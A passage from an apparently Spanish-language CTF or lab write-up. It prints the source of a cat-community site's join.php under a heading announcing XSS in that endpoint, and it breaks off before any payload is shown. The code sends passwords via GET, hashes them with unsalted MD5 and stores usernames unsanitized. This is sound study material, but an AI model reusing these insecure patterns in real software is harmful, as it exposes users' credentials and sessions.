</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Ahora ya tenemos código fuente de la pagina; vamos a ver si encontramos algún endpoint vulnerable;</p></div></div></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="XSS en el endpoint /join.php" dir="auto" class="heading" id="XSS_en_el_endpoint_/join.php">XSS en el endpoint /join.php</h1><div class="heading-children"><div class="el-p"><p dir="auto">Vemos a continuacion el codigo de join.php:</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>

<span class="token variable">$success_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token comment">// Registration process</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"GET"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'registerForm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$stmt_check</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username = :username OR email = :email"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stmt_check</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">':username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':email'</span> <span class="token operator">=&gt;</span> <span class="token variable">$email</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$existing_user</span> <span class="token operator">=</span> <span class="token variable">$stmt_check</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token scope">PDO<span class="token punctuation">::</span></span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$existing_user</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: Username or email already exists."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$stmt_insert</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO users (username, email, password) VALUES (:username, :email, :password)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt_insert</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">':username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':email'</span> <span class="token operator">=&gt;</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':password'</span> <span class="token operator">=&gt;</span> <span class="token variable">$password</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt_insert</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$success_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Registration successful!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: Unable to register user."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Login process</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"GET"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loginForm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loginUsername'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loginPassword'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username = :username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">':username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token scope">PDO<span class="token punctuation">::</span></span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Incorrect username or password."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>


<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Join the Best Cat Community<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/styles.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector"><span class="token class">.container</span></span> <span class="token punctuation">{</span>
        <span class="token property">max-width</span><span class="token punctuation">:</span> <span class="token number">600</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span> auto<span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode color">#fff</span><span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">10</span><span class="token unit">px</span> <span class="token color"><span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.card</span></span> <span class="token punctuation">{</span>
        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
        <span class="token property">transition</span><span class="token punctuation">:</span> height <span class="token number">0.3</span><span class="token unit">s</span> ease-in-out<span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token unit">px</span> solid <span class="token hexcode color">#ccc</span><span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">40</span><span class="token unit">px</span><span class="token punctuation">;</span> <span class="token comment">/* Increased margin between cards */</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.card</span><span class="token class">.register</span></span> <span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">400</span><span class="token unit">px</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.card</span><span class="token class">.login</span></span> <span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">400</span><span class="token unit">px</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">form</span> <span class="token punctuation">{</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">label<span class="token punctuation">,</span>
    input</span> <span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
        <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token unit">%</span><span class="token punctuation">;</span> <span class="token comment">/* Make inputs fill the width */</span>
    <span class="token punctuation">}</span>
    <span class="token selector">input<span class="token attribute"><span class="token punctuation">[</span><span class="token attr-name">type</span><span class="token operator">=</span><span class="token attr-value">"submit"</span><span class="token punctuation">]</span></span></span> <span class="token punctuation">{</span>
        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode color">#007bff</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode color">#fff</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token unit">px</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
        <span class="token property">transition</span><span class="token punctuation">:</span> background-color <span class="token number">0.3</span><span class="token unit">s</span><span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token unit">%</span><span class="token punctuation">;</span> <span class="token comment">/* Make button fill the width */</span>
    <span class="token punctuation">}</span>
    <span class="token selector">input<span class="token attribute"><span class="token punctuation">[</span><span class="token attr-name">type</span><span class="token operator">=</span><span class="token attr-value">"submit"</span><span class="token punctuation">]</span></span><span class="token pseudo-class">:hover</span></span> <span class="token punctuation">{</span>
        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode color">#0056b3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.toggle-link</span></span> <span class="token punctuation">{</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.toggle-link</span> a</span> <span class="token punctuation">{</span>
        <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode color">#007bff</span><span class="token punctuation">;</span>
        <span class="token property">transition</span><span class="token punctuation">:</span> color <span class="token number">0.3</span><span class="token unit">s</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.toggle-link</span> a<span class="token pseudo-class">:hover</span></span> <span class="token punctuation">{</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode color">#0056b3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.message</span></span> <span class="token punctuation">{</span>
        <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token color">green</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.error-message</span></span> <span class="token punctuation">{</span>
        <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token unit">px</span><span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token color">red</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/vote.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Vote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/contest.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Contest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/winners.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Winners<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/join.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Join<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Join the Best Cat Community<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$success_message</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$success_message</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$error_message</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error-message<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$error_message</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card register<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>Register<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>registerForm<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Email:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>registerForm<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Register<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card login<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginForm<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginUsername<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginUsername<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginUsername<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
